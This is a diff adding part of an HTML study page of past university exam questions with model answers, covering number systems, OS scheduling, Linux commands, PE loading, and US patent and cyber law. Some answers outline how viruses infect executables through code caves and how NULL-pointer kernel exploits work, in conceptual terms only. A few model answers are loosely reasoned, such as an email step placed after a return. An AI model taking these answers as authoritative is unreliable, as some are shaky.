+      <div class="q-marks">5 + 5 + 5 + 10 = 25 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body open">
+
+      <div class="sub-q">
+        <div class="sub-label">Q1(a) · 5 Marks</div>
+        <div class="sub-question">Algorithm: "Will I get a seat in the Hall of Residence?" based on IUT policy.</div>
+        <div class="answer">
+          <h4>Algorithm — Hall Seat Allocation</h4>
+<div class="code-block"><span class="keyword">Algorithm</span> HallSeatCheck:
+  <span class="keyword">Input:</span> cgpa, meritPosition, applicationReceived (bool), 
+         availableSeats, currentStudentCount
+
+  <span class="comment">// Step 1: Check basic eligibility</span>
+  <span class="keyword">IF</span> applicationReceived == FALSE:
+      RETURN <span class="string">"Not eligible: no application submitted"</span>
+
+  <span class="comment">// Step 2: Check if seats available</span>
+  <span class="keyword">IF</span> availableSeats == 0:
+      RETURN <span class="string">"No seats available — join waitlist"</span>
+
+  <span class="comment">// Step 3: Merit-based selection</span>
+  <span class="keyword">IF</span> meritPosition &lt;= availableSeats:
+      RETURN <span class="string">"Congratulations! Seat allocated."</span>
+      sendEmail(student)
+  <span class="keyword">ELSE</span>:
+      RETURN <span class="string">"Not selected in this round — waitlisted"</span>
+
+<span class="keyword">End Algorithm</span></div>
+          <div class="info-box note"><strong>Key Factors Considered</strong>Seat availability, merit rank (likely CGPA-based), timely application submission, email confirmation sent to successful applicants.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q1(b) · 5 Marks</div>
+        <div class="sub-question">List typical features an LMS must have. Suggest 2 exciting features for future inclusion.</div>
+        <div class="answer">
+          <h4>LMS (Learning Management System) Features</h4>
+          <ul class="ans-list">
+            <li>Course content upload (PDF, video, slides)</li>
+            <li>Assignment submission and grading</li>
+            <li>Announcement and notification system</li>
+            <li>Discussion forums / Q&amp;A boards</li>
+            <li>Quiz and exam management with auto-grading</li>
+            <li>Attendance tracking</li>
+            <li>Progress tracking and grade reports</li>
+          </ul>
+          <h4>Two Exciting Future Features</h4>
+          <p><strong>1. AI Personalized Learning Path:</strong> An AI analyzes each student's performance and automatically suggests remedial content, harder challenges, or study tips — adapting the curriculum to individual learning speed.</p>
+          <p><strong>2. VR/AR Virtual Classroom:</strong> Immersive 3D lectures and lab simulations (e.g., virtual chemistry lab) accessible via VR headset — enabling experiential learning remotely.</p>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q1(c) · 5 Marks</div>
+        <div class="sub-question">Give an example code/pseudo-code to demonstrate overflow in arithmetic operations.</div>
+        <div class="answer">
+          <h4>Integer Overflow</h4>
+          <p>Overflow occurs when an arithmetic result exceeds the maximum value a data type can hold, causing it to wrap around.</p>
+<div class="code-block"><span class="keyword">import</span> numpy <span class="keyword">as</span> np
+
+<span class="comment"># Using 8-bit unsigned integer (max value = 255)</span>
+a = np.uint8(<span class="num">250</span>)
+b = np.uint8(<span class="num">10</span>)
+result = a + b
+print(result)   <span class="comment"># Output: 4  (250+10=260, wraps: 260-256=4)</span>
+
+<span class="comment"># Signed 8-bit (max = 127)</span>
+x = np.int8(<span class="num">120</span>)
+y = np.int8(<span class="num">20</span>)
+print(x + y)    <span class="comment"># Output: -116  (wraps to negative!)</span></div>
+          <div class="info-box warn"><strong>Real-World Risk</strong>The 1996 Ariane 5 rocket crash was caused by integer overflow — a 64-bit float converted to 16-bit int exceeded its range, causing the guidance system to crash and self-destruct the rocket.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q1(d) · 5×2 = 10 Marks</div>
+        <div class="sub-question">Short: i. Two criteria for RAM technology. ii. Two places virus can hide in executable. iii. Hashes in Bitcoin and Linux login. iv. Cloud "-aas" services. v. What is a Server?</div>
+        <div class="answer">
+          <ul class="ans-list">
+            <li><strong>i. RAM Criteria:</strong> (1) <mark>Read/Write speed must match CPU speed</mark> — random access in nanoseconds. (2) <mark>Volatile with fast refresh</mark> — DRAM uses capacitors that need constant refreshing but still far faster than flash.</li>
+            <li><strong>ii. Virus Hiding Places:</strong> (1) <mark>Code Caves</mark> — empty padding bytes between/within PE sections. (2) <mark>New PE Section</mark> — appending a new .vir section with malicious code and redirecting the entry point to it.</li>
+            <li><strong>iii. Hashing Algorithms:</strong> Bitcoin uses <mark>SHA-256</mark>. Linux login passwords use <mark>SHA-512</mark> (with salt, stored in /etc/shadow). Older Linux used MD5.</li>
+            <li><strong>iv. Cloud "-aaS" Services:</strong> IaaS (Infrastructure), PaaS (Platform), SaaS (Software), FaaS (Function/Serverless), DBaaS (Database). <mark>SaaS reaches end users</mark> directly (Gmail, Office 365, Dropbox).</li>
+            <li><strong>v. Server:</strong> Hardware: a high-performance computer with redundant PSUs, ECC RAM, RAID storage, always-on uptime. Software: a program that listens on a port and responds to client requests (e.g., Apache HTTP server, MySQL server).</li>
+          </ul>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q2 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q2</div>
+      <div class="q-title">Number Systems, 2's Complement, Binary Short Questions</div>
+      <div class="q-marks">9 + 9 + 7 = 25 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <div class="sub-q">
+        <div class="sub-label">Q2(a) · 3×3 = 9 Marks</div>
+        <div class="sub-question">Convert decimal 57 to: i. Base 3, ii. Base 2, iii. Base 4.</div>
+        <div class="answer">
+          <h4>Conversions of 57</h4>
+          <table class="ans-table">
+            <tr><th>Division</th><th>Base 3 (÷3)</th><th>Base 2 (÷2)</th><th>Base 4 (÷4)</th></tr>
+            <tr><td>57 ÷ base</td><td>57÷3=19 R <strong>0</strong></td><td>57÷2=28 R <strong>1</strong></td><td>57÷4=14 R <strong>1</strong></td></tr>
+            <tr><td>next</td><td>19÷3= 6 R <strong>1</strong></td><td>28÷2=14 R <strong>0</strong></td><td>14÷4= 3 R <strong>2</strong></td></tr>
+            <tr><td>next</td><td> 6÷3= 2 R <strong>0</strong></td><td>14÷2= 7 R <strong>0</strong></td><td> 3÷4= 0 R <strong>3</strong></td></tr>
+            <tr><td>next</td><td> 2÷3= 0 R <strong>2</strong></td><td> 7÷2= 3 R <strong>1</strong></td><td>—</td></tr>
+            <tr><td>next</td><td>—</td><td> 3÷2= 1 R <strong>1</strong></td><td>—</td></tr>
+            <tr><td>next</td><td>—</td><td> 1÷2= 0 R <strong>1</strong></td><td>—</td></tr>
+            <tr><td><strong>Result (bottom→top)</strong></td><td><mark>2010₃</mark></td><td><mark>111001₂</mark></td><td><mark>321₄</mark></td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q2(b) · 3×3 = 9 Marks</div>
+        <div class="sub-question">4-bit 2's complement arithmetic. Comment on correctness: i. −6−3, ii. 5+3, iii. −4−4.</div>
+        <div class="answer">
+          <h4>4-bit 2's Complement (range: −8 to +7)</h4>
+          <table class="ans-table">
+            <tr><th>Operation</th><th>Binary</th><th>Result</th><th>Correct?</th></tr>
+            <tr><td>−6 − 3 = −9</td><td>1010 + 1101 = 0111</td><td>0111 = +7 in 4-bit</td><td>❌ <strong>OVERFLOW</strong> — −9 outside range</td></tr>
+            <tr><td>5 + 3 = 8</td><td>0101 + 0011 = 1000</td><td>1000 = −8 in 4-bit</td><td>❌ <strong>OVERFLOW</strong> — +8 outside range (+7 max)</td></tr>
+            <tr><td>−4 − 4 = −8</td><td>1100 + 1100 = 1000 (ignore carry)</td><td>1000 = −8 in 4-bit</td><td>✅ <strong>CORRECT</strong> — −8 is exactly the minimum</td></tr>
+          </table>
+          <div class="info-box tip"><strong>Overflow Detection Rule</strong>Overflow when: two positives give negative, or two negatives give positive. Check: carry into MSB ≠ carry out of MSB.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q2(c) · 7×1 = 7 Marks</div>
+        <div class="sub-question">Short: i. Why binary? ii. 2's complement 8-bit range. iii. Unsigned 8-bit range. iv. Signed 8-bit range. v. Bits in KiloByte. vi. 10 Mbps meaning. vii. ASCII values.</div>
+        <div class="answer">
+          <ul class="ans-list">
+            <li><strong>i. Binary in computers:</strong> Electronic circuits have two stable states — HIGH voltage (1) and LOW voltage (0). Binary maps perfectly to these physical states, making hardware simple and reliable.</li>
+            <li><strong>ii. 2's complement 8-bit:</strong> <mark>−128 to +127</mark></li>
+            <li><strong>iii. Unsigned 8-bit:</strong> <mark>0 to 255</mark></li>
+            <li><strong>iv. Signed 8-bit:</strong> <mark>−128 to +127</mark></li>
+            <li><strong>v. Bits in 1 KiloByte:</strong> 1 KB = 1024 bytes = <mark>8192 bits</mark></li>
+            <li><strong>vi. 10 Mbps:</strong> Network can transfer <mark>10 megabits (not megabytes) per second</mark>. Actual file transfer ≈ 1.25 MB/s (divide by 8).</li>
+            <li><strong>vii. ASCII:</strong> American Standard Code for Information Interchange — a 7-bit encoding mapping 128 characters (letters, digits, symbols) to numbers. e.g., 'A'=65, 'a'=97, '0'=48.</li>
+          </ul>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q3 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q3</div>
+      <div class="q-title">Linux Commands (ls/grep), CPU Control Recovery, OS Scheduling, File Permissions</div>
+      <div class="q-marks">5 + 5 + 5 + 10 = 25 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <div class="sub-q">
+        <div class="sub-label">Q3(a) · 5 Marks</div>
+        <div class="sub-question">Write a command using <code>ls</code> and <code>grep</code> that prints only directories in /home.</div>
+        <div class="answer">
+          <h4>Command</h4>
+          <div class="code-block">ls -l /home | grep <span class="string">'^d'</span></div>
+          <ul class="ans-list">
+            <li><code>ls -l /home</code> — long listing of /home directory</li>
+            <li><code>|</code> — pipe: sends output of ls as input to grep</li>
+            <li><code>grep '^d'</code> — <code>^</code> anchors to start of line; <code>d</code> matches lines starting with 'd' = directories only</li>
+          </ul>
+          <div class="code-block"><span class="comment"># Sample Output:</span>
+drwxr-xr-x 5 alice alice 4096 Dec 01 home_alice
+drwxr-xr-x 3 bob   bob   4096 Dec 02 home_bob</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q3(b) · 5 Marks</div>
+        <div class="sub-question">For a single-core CPU, when OS transfers CPU control to a program, how does OS regain control?</div>
+        <div class="answer">
+          <h4>OS Regaining CPU Control — Preemption</h4>
+          <p>The OS uses a <strong>hardware timer interrupt</strong> (programmable interval timer) to forcibly reclaim the CPU. Before giving control to a program, the OS programs the timer for a time quantum (e.g., 10ms). When the timer fires, it generates a <mark>hardware interrupt</mark>, forcing the CPU to jump to the OS interrupt handler.</p>
+          <ul class="ans-list">
+            <li><strong>Voluntary Yield:</strong> Program calls a system call (I/O, sleep) → OS scheduler picks next process.</li>
+            <li><strong>Preemptive Interrupt:</strong> Timer fires → CPU saves program state (registers, PC) to Process Control Block (PCB) → OS resumes.</li>
+            <li><strong>Exception/Trap:</strong> Program causes fault (divide by zero, page fault) → OS handles and possibly terminates process.</li>
+          </ul>
+          <div class="info-box key"><strong>Without Timer Interrupts</strong>A rogue program could loop forever and starve the OS. Timer-based preemption is what makes multitasking possible.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q3(c) · 5 Marks</div>
+        <div class="sub-question">Computer running many programs — text input to Word experiences delayed output. Explain via OS mechanism.</div>
+        <div class="answer">
+          <h4>Delayed Input Response — CPU Scheduling</h4>
+          <p>When many CPU-intensive programs run simultaneously, the OS scheduler divides CPU time among all processes using <strong>time-sharing</strong>. Each process gets a small time quantum (e.g., 5–20ms) in round-robin.</p>
+          <p>Word.exe shares CPU with other processes. When Word's time quantum is exhausted, it is <mark>preempted</mark> and placed back in the ready queue. Your keyboard input is buffered in the OS input queue. Word processes the buffered keystrokes only when it next gets CPU time — causing a visible delay.</p>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q3(d) · 5×2 = 10 Marks</div>
+        <div class="sub-question">Short: i. Two pointers of empty directory. ii. Meaning of 0755. iii. Two executable file types. iv. CPU usage of msword with graphics. v. Kernel definition.</div>
+        <div class="answer">
+          <ul class="ans-list">
+            <li><strong>i. Empty Directory Pointers:</strong> Every directory has at least two references: <mark><code>.</code> (dot)</mark> — points to itself (current directory), and <mark><code>..</code> (dot-dot)</mark> — points to the parent directory.</li>
+            <li><strong>ii. Permission 0755:</strong> Owner=<mark>rwx(7)</mark> full access; Group=<mark>r-x(5)</mark> read+execute; Others=<mark>r-x(5)</mark> read+execute. Typical for executable programs/directories.</li>
+            <li><strong>iii. Executable File Types:</strong> <mark>Binary Executable</mark> (compiled machine code, e.g., .exe, ELF) and <mark>Script files</mark> (text files with shebang line, e.g., .sh, .py — executed by an interpreter).</li>
+            <li><strong>iv. MSWord CPU during Graphics:</strong> <mark>Nearly 0% CPU</mark>. When displaying graphics (projector output), the GPU handles rendering. Word.exe is in a waiting/idle state — blocked on I/O or GPU output — so the CPU scheduler doesn't allocate it CPU time.</li>
+            <li><strong>v. Kernel:</strong> The kernel is the core component of an OS that runs in privileged mode (Ring 0), directly managing hardware. It handles process scheduling, memory management, device drivers, system calls, and inter-process communication.</li>
+          </ul>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q4 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q4</div>
+      <div class="q-title">Linker Task, PE Sections in Loader, FileAlignment &amp; Virus, XSS &amp; NULL Pointer</div>
+      <div class="q-marks">5+5+5+10 = 25 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <div class="sub-q">
+        <div class="sub-label">Q4(a) · 5 Marks</div>
+        <div class="sub-question">What is the task of a linker in compiler toolchain?</div>
+        <div class="answer">
+          <h4>Linker's Role</h4>
+          <ul class="ans-list">
+            <li><strong>Symbol Resolution:</strong> Matches function calls across object files (e.g., <code>main.o</code> calling <code>printf</code> from <code>libc</code>).</li>
+            <li><strong>Relocation:</strong> Assigns final virtual memory addresses to all code and data sections.</li>
+            <li><strong>Section Merging:</strong> Combines all <code>.text</code> sections, all <code>.data</code> sections from each .o into one.</li>
+            <li><strong>Library Inclusion:</strong> Copies needed library routines (static) or records DLL dependencies (dynamic).</li>
+            <li><strong>PE/ELF Header Generation:</strong> Produces the final executable with correct headers, entry point, and section table.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q4(b) · 5 Marks</div>
+        <div class="sub-question">PE section header has: SizeOfRawData, PointerToRawData, VirtualSize, VirtualAddress. How does the loader use these?</div>
+        <div class="answer">
+          <h4>PE Section Header — Loader Usage</h4>
+          <table class="ans-table">
+            <tr><th>Field</th><th>Meaning</th><th>How Loader Uses It</th></tr>
+            <tr><td>PointerToRawData</td><td>Offset of section data in the PE file on disk</td><td>Loader reads from this file offset to find the section's raw bytes</td></tr>
+            <tr><td>SizeOfRawData</td><td>Size of section data on disk (aligned to FileAlignment)</td><td>Loader knows how many bytes to read from disk</td></tr>
+            <tr><td>VirtualAddress</td><td>Preferred memory address (RVA from ImageBase) in RAM</td><td>Loader maps section to: ImageBase + VirtualAddress in the process's virtual address space</td></tr>
+            <tr><td>VirtualSize</td><td>Actual size needed in memory (may be larger due to BSS/uninitialized data)</td><td>Loader allocates VirtualSize bytes in memory; zero-fills any excess beyond SizeOfRawData</td></tr>
+          </table>
+          <div class="info-box tip"><strong>Key Point</strong>VirtualSize ≥ SizeOfRawData usually. The loader copies raw bytes from disk, then zero-fills the remainder up to VirtualSize in memory.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q4(c) · 5 Marks</div>
+        <div class="sub-question">FileAlignment in Optional Header may help virus enter an executable. Explain.</div>
+        <div class="answer">
+          <h4>FileAlignment &amp; Code Caves</h4>
+          <p><strong>FileAlignment</strong> forces each section to start at a multiple of its value (typically 512 or 4096 bytes) on disk. Since code sections rarely fill their allocated space exactly, <mark>padding bytes (NULL bytes) fill the gap</mark> — creating a <strong>Code Cave</strong>.</p>
+          <p>A virus writes its code into this padding, then changes the <strong>Entry Point</strong> to point to the cave. Since the section size on disk remains the same, the file size doesn't change — making detection harder.</p>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q4(d) · 10 Marks</div>
+        <div class="sub-question">Briefly explain XSS and NULL Pointer Exception as cyber security threats.</div>
+        <div class="answer">
+          <h4>XSS (Cross-Site Scripting)</h4>
+          <p>Attacker injects malicious scripts into web pages. Victims' browsers execute the script in the context of the trusted site. Impact: session hijacking, credential theft, malicious redirects. <strong>Prevention:</strong> Output encoding, CSP headers, HttpOnly cookies.</p>
+          <h4>NULL Pointer Exception — Security Threat</h4>
+          <ul class="ans-list">
+            <li><strong>Crash/DoS:</strong> Deliberately triggering NULL dereference crashes the application (Denial of Service).</li>
+            <li><strong>NULL Pointer Dereference Attack:</strong> On older kernels, address 0 was mappable. Attacker maps shellcode to address 0, then triggers a kernel NULL dereference — causing kernel to execute attacker's code with root privileges.</li>
+            <li><strong>Prevention:</strong> Always check pointers before use (<code>if (ptr != NULL)</code>); enable OS-level NULL dereference protection; use memory-safe languages (Rust, Go).</li>
+          </ul>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q5 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q5</div>
+      <div class="q-title">USA Patent Law (5 Clauses) &amp; Cyber Security Laws in USA</div>
+      <div class="q-marks">10 + 15 = 25 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <div class="sub-q">
+        <div class="sub-label">Q5(a) · 10 Marks</div>
+        <div class="sub-question">Describe the 5 clauses of USA Patent Law briefly.</div>
+        <div class="answer">
+          <h4>Five Key Clauses of US Patent Law (Title 35 USC)</h4>
+          <table class="ans-table">
+            <tr><th>Clause / Section</th><th>Brief Description</th></tr>
+            <tr><td>§ 101 — Patentable Subject Matter</td><td>Any new and useful process, machine, manufacture, or composition of matter. Excludes laws of nature, abstract ideas, and natural phenomena.</td></tr>
+            <tr><td>§ 102 — Novelty Requirement</td><td>Invention must be NEW — not previously patented, published, publicly used, or on sale before filing date, anywhere in the world.</td></tr>
+            <tr><td>§ 103 — Non-Obviousness</td><td>Even if novel, if the invention would be obvious to a person with ordinary skill in the field, it cannot be patented. Prevents trivial combinations.</td></tr>
+            <tr><td>§ 112 — Written Description / Enablement</td><td>Inventor must fully describe the invention so that someone skilled in the field could reproduce it. Ensures knowledge disclosure to the public after patent expiry.</td></tr>
+            <tr><td>§ 154 — Patent Term</td><td>A granted patent lasts <mark>20 years from the filing date</mark>. After expiry, the invention enters the public domain and anyone can use it freely.</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q5(b) · 15 Marks</div>
+        <div class="sub-question">Briefly describe Cyber Security Laws in USA.</div>
+        <div class="answer">
+          <h4>Major Cyber Security Laws in the USA</h4>
+          <table class="ans-table">
+            <tr><th>Law</th><th>Year</th><th>Key Provisions</th></tr>
+            <tr><td><strong>CFAA</strong> (Computer Fraud and Abuse Act)</td><td>1986</td><td>Criminalizes unauthorized computer access, hacking, and distribution of malware. Foundation of US cybercrime prosecution.</td></tr>
+            <tr><td><strong>ECPA</strong> (Electronic Communications Privacy Act)</td><td>1986</td><td>Protects electronic communications from unauthorized interception. Governs government wiretapping and data requests.</td></tr>
+            <tr><td><strong>HIPAA</strong> (Health Insurance Portability Act)</td><td>1996</td><td>Protects healthcare data (PHI). Mandates security safeguards for electronic health records.</td></tr>
+            <tr><td><strong>FISMA</strong> (Federal Info Security Management Act)</td><td>2002</td><td>Requires federal agencies to maintain comprehensive information security programs using NIST standards.</td></tr>
+            <tr><td><strong>GLBA</strong> (Gramm-Leach-Bliley Act)</td><td>1999</td><td>Requires financial institutions to protect customers' financial data and explain information-sharing practices.</td></tr>
+            <tr><td><strong>CISA</strong> (Cybersecurity &amp; Infrastructure Security Agency Act)</td><td>2018</td><td>Established CISA agency. Protects critical national infrastructure (power grids, water systems) from cyber threats.</td></tr>
+            <tr><td><strong>Executive Order 14028</strong></td><td>2021</td><td>Biden's EO on "Improving the Nation's Cybersecurity" — mandated zero-trust architecture, MFA, and incident reporting for federal contractors.</td></tr>
+          </table>
+          <div class="info-box key"><strong>Exam Tip — Most Important to Remember</strong>CFAA (hacking law), HIPAA (healthcare), FISMA (federal IT), CISA (infrastructure). These four come up most frequently in exams.</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q6 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q6</div>
+      <div class="q-title">File Systems (FAT, FAT32), Short Notes: Keyboard, Hard Disk, LED Monitor</div>
+      <div class="q-marks">10 + 15 = 25 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <div class="sub-q">
+        <div class="sub-label">Q6(a) · 10 Marks</div>
+        <div class="sub-question">Explain FAT and FAT32 file systems with pros and cons.</div>
+        <div class="answer">
+          <h4>FAT (File Allocation Table)</h4>
+          <table class="ans-table">
+            <tr><th></th><th>FAT16</th><th>FAT32</th></tr>
+            <tr><td>Table Entry Size</td><td>16 bits</td><td>32 bits (28 bits used)</td></tr>
+            <tr><td>Max File Size</td><td>2 GB</td><td>4 GB</td></tr>
+            <tr><td>Max Volume Size</td><td>2 GB</td><td>2 TB (theoretically 8 TB)</td></tr>
+            <tr><td>File Names</td><td>8.3 (8 char name, 3 char extension)</td><td>Long File Names (LFN) up to 255 chars</td></tr>
+          </table>
+          <h4>Pros of FAT32</h4>
+          <ul class="ans-list">
+            <li>Universal compatibility — works on all OS and devices (cameras, TVs, cars)</li>
+            <li>Simple structure — easy to implement in embedded systems</li>
+          </ul>
+          <h4>Cons of FAT32</h4>
+          <ul class="ans-list">
+            <li><mark>4 GB maximum file size</mark> — can't store large video files</li>
+            <li>No file permissions or security model</li>
+            <li>No journaling — prone to corruption on power loss</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q6(b) · 3×5 = 15 Marks</div>
+        <div class="sub-question">Short notes: i. Keyboard, ii. Hard Disk, iii. LED Monitor.</div>
+        <div class="answer">
+          <h4>i. Keyboard</h4>
+          <p>A keyboard is an input device with mechanical or membrane switches under each key. When a key is pressed, its position in a key matrix is detected by a <strong>microcontroller</strong> inside the keyboard, which generates a <mark>scan code</mark>. The keyboard controller sends this scan code to the OS via USB or PS/2. The OS maps the scan code to a character using a keymap. Modern keyboards use USB HID (Human Interface Device) protocol. Types: Membrane (quiet, cheap), Mechanical (tactile, durable), Capacitive (no physical contact).</p>
+
+          <h4>ii. Hard Disk</h4>
+          <p>HDD stores data magnetically on spinning platters. Components: platters (ferromagnetic coating), read/write heads (electromagnetic), actuator arm, spindle motor. Data organized in tracks → sectors (512B/4KB) → clusters. Access time = seek + rotational latency + transfer time. Typical speed: 7200 RPM. Interface: SATA, SAS. Advantages: cheap per GB, high capacity. Disadvantages: slow vs SSD, fragile (moving parts), susceptible to magnetic fields.</p>
+
+          <h4>iii. LED Monitor</h4>
+          <p>An <strong>LED monitor</strong> is an LCD (Liquid Crystal Display) that uses <mark>LED (Light Emitting Diode) backlighting</mark> instead of older CCFL fluorescent backlights. LCDs don't emit light — crystals block/pass backlight to create images. LEDs are more energy-efficient, thinner, brighter, and have better contrast. Types: Edge-lit LED, Full-array LED, OLED (each pixel self-illuminates — best contrast). Resolution measured in pixels (1920×1080 = Full HD). Response time: 1–5ms for gaming monitors.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</div><!-- end B22 -->
+
+
+<!-- ═══════════════════════════════════════════ B23 ═══════════════════════════════════════════ -->
+<div class="year-section" id="b23">
+
+  <div class="paper-header">
+    <div class="paper-info">
+      <h2>Winter Semester 2023–2024</h2>
+      <div class="semester">08 April 2025 · Duration: 2 Hours · Full Marks: 120 · Answer ALL 4 Questions</div>
+    </div>
+    <div class="paper-badges">
+      <span class="badge badge-gold">120 Marks</span>
+      <span class="badge badge-teal">4 Questions</span>
+    </div>
+  </div>
+
+  <!-- Q1 -->
+  <div class="q-block">
+    <div class="q-header open" onclick="toggleQ(this)">
+      <div class="q-num">Q1</div>
+      <div class="q-title">OS Mechanisms (CPU, Input Delay, File Move), Linux Commands, CPU Control Recovery</div>
+      <div class="q-marks">15 + 10 + 5 = 30 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body open">
+
+      <div class="sub-q">
+        <div class="sub-label">Q1(a) · 3×5 = 15 Marks</div>
+        <div class="sub-question">Explain in terms of OS working mechanism: i. word.exe takes no CPU when projector shows graphics. ii. Text input to word.exe experiences delayed output. iii. Moving a folder on same drive is fast; cut-pasting 5000 files takes much more time.</div>
+        <div class="answer">
+          <h4>i. word.exe — 0% CPU during graphics output</h4>
+          <p>When word.exe sends rendered content to the display, the actual graphics processing is handled by the <strong>GPU</strong>. The CPU hands off the display buffer and the GPU renders it independently. Word.exe enters a <mark>BLOCKED/WAITING state</mark> — it issues an I/O request to the display subsystem and waits. The OS scheduler sees word.exe is not runnable and allocates CPU time to other processes.</p>
+
+          <h4>ii. Delayed text input in word.exe</h4>
+          <p>The OS uses <strong>time-sharing / round-robin scheduling</strong>. Each process gets a small CPU time quantum. When many CPU-hungry processes run, word.exe gets preempted frequently. Your keystrokes are stored in the OS <mark>input buffer/queue</mark>. Word.exe only processes them when it next gets a CPU quantum — causing a visible delay.</p>
+
+          <h4>iii. Move folder fast; cut-paste 5000 files slow</h4>
+          <p>On the <strong>same physical drive</strong>, moving a folder is simply updating the <mark>directory entry</mark> in the file system's metadata — the actual data blocks on disk are not moved. This is an O(1) metadata operation taking milliseconds.</p>
+          <p><strong>Cut and paste</strong> of 5000 individual files requires: for each file — read data blocks from disk (seek + read), write to new location (seek + write), update directory entries, and delete from old location. This is O(n) disk I/O operations with physical head movement — explaining the massive time difference.</p>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q1(b) · 2+3+5 = 10 Marks</div>
+        <div class="sub-question">Same ls/cd error scenario as B21 Q1(c). i. Cause of error. ii. Output of ls -l. iii. Program to count files and directories.</div>
+        <div class="answer">
+          <h4>(i) Cause of Error — 2 Marks</h4>
+          <p><mark>myfileDirDev is a file, not a directory.</mark> The <code>cd</code> command can only navigate into directories.</p>
+
+          <h4>(ii) Output of <code>ls -l</code> — 3 Marks</h4>
+          <div class="code-block">total 32
+drwxr-xr-x 2 root root 4096 Dec 10 09:00 bin
+drwxr-xr-x 3 root root 4096 Dec 10 09:00 home
+-rw-r--r-- 1 root root 1024 Dec 10 10:00 myfileDirDev</div>
+          <p>Note: <code>myfileDirDev</code> starts with <code>-</code> (regular file), not <code>d</code> (directory).</p>
+
+          <h4>(iii) Algorithm + Program — 5 Marks</h4>
+<div class="code-block"><span class="keyword">import</span> subprocess
+
+<span class="keyword">def</span> count_entries(path=<span class="string">"/"</span>):
+    fileCount, dirCount = <span class="num">0</span>, <span class="num">0</span>
+    output = subprocess.getoutput(<span class="string">f"ls -l {path}"</span>)
+    <span class="keyword">for</span> line <span class="keyword">in</span> output.splitlines():
+        <span class="keyword">if</span> line.startswith(<span class="string">'-'</span>): fileCount += <span class="num">1</span>
+        <span class="keyword">elif</span> line.startswith(<span class="string">'d'</span>): dirCount  += <span class="num">1</span>
+    print(<span class="string">f"Files: {fileCount} | Directories: {dirCount}"</span>)
+
+count_entries()</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q1(c) · 5 Marks</div>
+        <div class="sub-question">When OS transfers CPU control to a program, how does it regain control?</div>
+        <div class="answer">
+          <h4>OS Regaining CPU Control</h4>
+          <ul class="ans-list">
+            <li><strong>Timer Interrupt (Preemption):</strong> OS sets a hardware timer before scheduling a process. When timer fires, <mark>hardware interrupt</mark> forces CPU to jump to OS interrupt handler. OS saves process state to PCB and schedules next process.</li>
+            <li><strong>System Calls (Traps):</strong> Program voluntarily calls OS services (read/write file, allocate memory). OS handles the request; scheduler may switch to another process while waiting for I/O.</li>
+            <li><strong>Exceptions/Faults:</strong> Program causes fault (divide by zero, page fault, segfault) → CPU transfers to OS exception handler → OS handles/terminates the offending process.</li>
+          </ul>
+          <div class="info-box key"><strong>The Critical One</strong>Timer interrupt is the ONLY mechanism that works unconditionally — it regains control even from a program stuck in an infinite loop.</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q2 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q2</div>
+      <div class="q-title">Man-Month, Cloud "-aaS" Services, Python NumPy Array Slicing, Interpreted Language</div>
+      <div class="q-marks">5 + 10 + 10 + 5 = 30 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <div class="sub-q">
+        <div class="sub-label">Q2(a) · 5 Marks</div>
+        <div class="sub-question">What is 'Man-month'? Can you always increase productivity by hiring more people?</div>
+        <div class="answer">
+          <h4>Man-Month</h4>
+          <p>A <strong>man-month</strong> is a unit of work representing one person working for one month. e.g., a 12 man-month project could theoretically be done by 12 people in 1 month, or 1 person in 12 months.</p>
+          <h4>Brook's Law — Adding People Doesn't Always Help</h4>
+          <p><mark>"Adding manpower to a late software project makes it later."</mark> — Fred Brooks (The Mythical Man-Month, 1975).</p>
+          <ul class="ans-list">
+            <li><strong>Ramp-up time:</strong> New hires need time to understand the codebase — consuming existing team members' time for training.</li>
